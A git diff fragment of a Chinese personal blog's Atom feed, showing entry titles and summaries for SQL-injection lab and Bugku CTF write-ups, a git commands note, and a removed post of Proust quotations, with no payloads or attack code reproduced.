-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Catcher</name></author><summary type="html">记录布尔盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-8(布尔型单引号GET盲注)。</summary></entry><entry><title type="html">sqli-labs Less-5</title><link href="http://localhost:4000/2018/08/09/sqli-l5/" rel="alternate" type="text/html" title="sqli-labs Less-5" /><published>2018-08-09T00:00:00+08:00</published><updated>2018-08-09T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/09/sqli-l5</id><content type="html" xml:base="http://localhost:4000/2018/08/09/sqli-l5/">&lt;p&gt;Less-5(GET-Double injection-Single Quotes-String)：这个练习比较不错，主要就是基于报错的双查询注入。
+&lt;p&gt;&lt;a href=&quot;https://git-scm.com/book/zh/v2&quot;&gt;https://git-scm.com/book/zh/v2&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><summary type="html">记录那些常用的 git 命令，持续更新……</summary></entry><entry><title type="html">sqli-labs Less-5</title><link href="http://localhost:4000/2018/08/09/sqli-l5/" rel="alternate" type="text/html" title="sqli-labs Less-5" /><published>2018-08-09T00:00:00+08:00</published><updated>2018-08-09T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/09/sqli-l5</id><content type="html" xml:base="http://localhost:4000/2018/08/09/sqli-l5/">&lt;p&gt;Less-5(GET-Double injection-Single Quotes-String)：这个练习比较不错，主要就是基于报错的双查询注入。
 &lt;!--more--&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;0x01双查询注入&quot;&gt;0x01双查询注入&lt;/h2&gt;
@@ -1796,41 +1737,4 @@ clicks=1000001
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h2 id=&quot;25cookies欺骗&quot;&gt;25.cookies欺骗&lt;/h2&gt;</content><author><name>Catcher</name></author><summary type="html">最近在做 bugku 上的题目，感觉题目对于我这种入门级的 CTF 选手还是挺友好的，索性就记录一下，下面直接给 tips 或 tricks 或 payload，主要是 web 的题目。持续更新……</summary></entry><entry><title type="html">追忆似水年华</title><link href="http://localhost:4000/2018/06/02/zyshnh/" rel="alternate" type="text/html" title="追忆似水年华" /><published>2018-06-02T00:00:00+08:00</published><updated>2018-06-02T00:00:00+08:00</updated><id>http://localhost:4000/2018/06/02/zyshnh</id><content type="html" xml:base="http://localhost:4000/2018/06/02/zyshnh/">&lt;blockquote&gt;
-  &lt;p&gt;“他是个彻底的失败者，一生没工作，情事不断还是个同性恋，花20年写了一本没几个人看的小说。但晚年回首人生，他发现那些难熬的日子才是一生中最好的时光，因为那些日子造就了他。而快活的日子全是浪费时间，没有任何收获。”
-—《阳光小美女》&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;!--more--&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;生命只是一连串孤立的片刻，靠着回忆和幻想，许多意义浮现了，然后消失，消失之后又浮现。
-&lt;br /&gt;&lt;br /&gt;
-想想吧，因为我们的懒惰，总想着来日方长，做何事都能拖则拖，竟致那么多的计划、旅行、恋爱、对人生的探究未见实行！大难不至，我们就会什么也不做，我们会发现自己又回到日复一日的平庸生活，生活的欲望被消磨殆尽。
-&lt;br /&gt;&lt;br /&gt;
-我终将遗忘梦境中的那些路径、山峦与田野，遗忘那些永远不能实现的梦。
-&lt;br /&gt;&lt;br /&gt;
-唯一真实的乐园是我们已经失去的乐园，唯一有吸引力的世界是我们尚未踏入的世界。
-&lt;br /&gt;&lt;br /&gt;
-我们记忆最精华的部分保存在我们的外在世界，在雨日潮湿的空气里、在幽闭空间的气味里、在刚生起火的壁炉的芬芳里，也就是说，在每一个地方，只要我们的理智视为无用而加以摒弃的事物又重新被发现的话。那是过去岁月最后的保留地，是它的精粹，在我们的眼泪流干以后，又让我们重新潸然泪下。
-&lt;br /&gt;&lt;br /&gt;
-真正的发现之旅非发现新景观，而是有新的目光。
-&lt;br /&gt;&lt;br /&gt;
-尽管我们知道再无任何希望，我们仍然期待。等待稍稍一点动静，稍稍一点声响。
-&lt;br /&gt;&lt;br /&gt;
-我现在才明白，凡属严重错误都有一个共同的性质：那就是没有克制感情的冲动。
-&lt;br /&gt;&lt;br /&gt;
-如果第一遍没有理解内容,那么第二第三遍也不会和第一遍有什么差别,即使去到第十遍，也不会有什么起色。第一遍没记住，缺的是理解，而不是记忆。
-&lt;br /&gt;&lt;br /&gt;
-我们长大成人后的惯常态度，也就是见到苦难和不平，扭过脸去以求得眼不见为净。
-&lt;br /&gt;&lt;br /&gt;
-习惯是人的第二本性。它使我们不能认识一个人的主要本性，就这一点而言，习惯既非残忍也不迷人。
-&lt;br /&gt;&lt;br /&gt;
-我们听到他的名字不会感到肉体的痛苦，看到他的笔迹也不会发抖，我们不会为了在街上遇见他而改变我们的行程，情感现实逐渐地变成心理现实，成为我们的精神现状：冷漠和遗忘。其实，当我们恋爱时，我们就预见到了日后的结局了，而正是这种预见让我们泪流满面。
-&lt;br /&gt;&lt;br /&gt;
-时间看起来好象完全消逝，其实不然，它正与我们自身融为一体。
-&lt;br /&gt;&lt;br /&gt;
-未完待续……
-&lt;br /&gt;&lt;br /&gt;
-via:&lt;a href=&quot;https://codepen.io/yangpeng/full/mXZmVa/&quot;&gt;codeopen by Catcer&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><summary type="html">“他是个彻底的失败者，一生没工作，情事不断还是个同性恋，花20年写了一本没几个人看的小说。但晚年回首人生，他发现那些难熬的日子才是一生中最好的时光，因为那些日子造就了他。而快活的日子全是浪费时间，没有任何收获。” —《阳光小美女》</summary></entry></feed>
+&lt;h2 id=&quot;25cookies欺骗&quot;&gt;25.cookies欺骗&lt;/h2&gt;</content><author><name>Catcher</name></author><summary type="html">最近在做 bugku 上的题目，感觉题目对于我这种入门级的 CTF 选手还是挺友好的，索性就记录一下，下面直接给 tips 或 tricks 或 payload，主要是 web 的题目。持续更新……</summary></entry></feed>
